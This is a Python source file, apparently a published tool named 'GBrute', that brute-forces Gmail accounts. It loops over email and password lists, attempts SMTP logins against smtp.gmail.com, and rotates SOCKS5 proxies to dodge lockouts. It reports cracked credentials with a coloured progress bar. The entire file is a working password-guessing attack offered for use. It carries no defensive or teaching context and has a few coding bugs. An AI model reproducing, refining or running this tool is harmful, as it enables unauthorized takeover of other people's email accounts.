#Programmer : https://github.com/i4mShayan
import time
import sys
import smtplib
import socks # PySocks
import socket
import os

CURSOR_UP_ONE = '\x1b[1A'
ERASE_LINE = '\x1b[2K'

def progress_bar(cracked,count,result=None,email=None,password=None):
    toolbar_width = 20
    percent = round((toolbar_width * cracked) / count)

    if cracked==1:
        sys.stdout.write(CURSOR_UP_ONE)
        sys.stdout.write(ERASE_LINE)
    elif cracked > 1:
        for i in range(2):
            sys.stdout.write(CURSOR_UP_ONE)
            sys.stdout.write(ERASE_LINE)
    
    text = "\033[1;37mCracking {} > [{}] {}%".format(email," " * toolbar_width,round(cracked/count*100))


    sys.stdout.write(text)

    if round(cracked/count*100) < 10:
        delete = 1
    elif round(cracked/count*100) < 100:
        delete = 2
    else :
        delete = 3
    sys.stdout.write("\b" * (toolbar_width+3+delete))
    sys.stdout.write(("-"*percent)+(toolbar_width-percent)*" ")
    sys.stdout.write("] {}%\n".format(round(cracked/count*100)))

    if password != None:
        if result=="succeed":
            sys.stdout.write("\033[0;32m  ---> State > {} : {}".format("\033[0;37m%s"%password,"\033[1;32msucceed\n"))
        elif result=="failed" :
            sys.stdout.write("\033[0;32m  ---> State > {} : {}".format("\033[0;37m%s"%password,"\033[1;31mFailed\n"))

    if cracked/count==1 and result=="failed":
        for i in range(2):
            sys.stdout.write(CURSOR_UP_ONE)
            sys.stdout.write(ERASE_LINE)



def main():
    if sys.platform == "windows":
        os.system("cls")
    else :
        os.system("clear")
    print("\033[1;36m",end="")
    print(r"""
  _____ ____             _       
 / ____|  _ \           | |      
| |  __| |_) |_ __ _   _| |_ ___ 
| | |_ |  _ <| '__| | | | __/ _ \
| |__| | |_) | |  | |_| | ||  __/
 \_____|____/|_|   \__,_|\__\___| by i4mShayan
        """)

    email_list = input("\033[1;37;0mEnter email list file name(Default: email.txt) >>")
    pass_list = input("Enter passlist file name(Default: pass.txt) >>")
    proxy_list = input("Enter proxy file name(Default: empty) >>")
    for i in range(3):
        sys.stdout.write(CURSOR_UP_ONE)
        sys.stdout.write(ERASE_LINE)

    if email_list == "":
        email_list = "email.txt"
    if pass_list == "":
        pass_list = "pass.txt"
    if proxy_list == "":
        proxy_list = None

    try:
        with open(email_list, 'r') as file:
            emails = file.readlines()
    except FileNotFoundError:
        print("\033[1;31mThe EMAIL LIST file you have entered not found.\n\033[0;32mPlease copy that file to this program directory,if you correctly entered your passlist file name.\033[0;37m\n")
    
    try:
        with open(pass_list, 'r') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print("\033[1;31mThe PASS LIST file you have entered not found.\n\033[0;32mPlease copy that file to this program directory,if you correctly entered your passlist file name.\033[0;37m\n")
    
    if proxy_list !=  None:
        try:
            with open(proxy_list, 'r') as file:
                proxies = file.readlines()
        except FileNotFoundError:
            print("\033[1;31mThe PROXY LIST file you have entered not found.\n\033[0;32mPlease copy that file to this program directory,if you correctly entered your passlist file name.\033[0;37m\n")
    

    if len(proxies) >= len(passwords)*len(emails):
        px = 0
        try :
            for e in emails:
                progress_bar(0,len(passwords))
                try :

                    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
                    smtpserver.ehlo()
                    smtpserver.starttls()
                except smtplib.SMTPServerDisconnected:
                    print("/033[1;31mIt seems something is wrong.")
                c = 0
                e = e.replace('\n', '')
                for p in passwords:
                    p = p.replace('\n', '')
                    try :
                        proxy = proxies[px].replace('\n','').split(":")
                        socket.socket = socks.socksocket
                        socks.set_default_proxy(socks.SOCKS5,proxy[0],proxy[1] )
                        smtpserver.login(e, p)
                        result = "succeed"
                        c = len(passwords)
                        smtpserver.close()
                        progress_bar(c,len(passwords),result,e,p)
                        break
                    except smtplib.SMTPAuthenticationError:
                        result = "failed"
                        c += 1
                        progress_bar(c,len(passwords),result,e,p)
                    px += 1
        except UnboundLocalError:
            pass



if __name__ == "__main__":
    main()